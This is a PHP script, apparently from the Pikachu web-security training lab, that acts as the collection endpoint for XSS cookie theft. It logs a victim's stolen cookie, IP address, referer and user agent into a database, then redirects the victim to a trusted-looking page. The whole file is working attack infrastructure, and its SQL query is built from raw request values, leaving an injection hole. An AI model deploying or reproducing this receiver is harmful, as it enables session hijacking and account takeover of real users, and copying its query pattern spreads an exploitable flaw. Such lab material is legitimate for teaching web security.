<?php
include_once '../inc/config.inc.php';
include_once '../inc/mysql.inc.php';
$link=connect();

//这个是获取cookie的api页面

if(isset($_GET['cookie'])){
    $time=date('Y-m-d g:i:s');
    $ipaddress=getenv ('REMOTE_ADDR');
    $cookie=$_GET['cookie'];
    $referer=$_SERVER['HTTP_REFERER'];
    $useragent=$_SERVER['HTTP_USER_AGENT'];
    $query="insert cookies(time,ipaddress,cookie,referer,useragent) 
    values('$time','$ipaddress','$cookie','$referer','$useragent')";
    $result=mysqli_query($link, $query);
}
header("Location:http://192.168.1.4/pikachu/index.php");//重定向到一个可信的网站

?>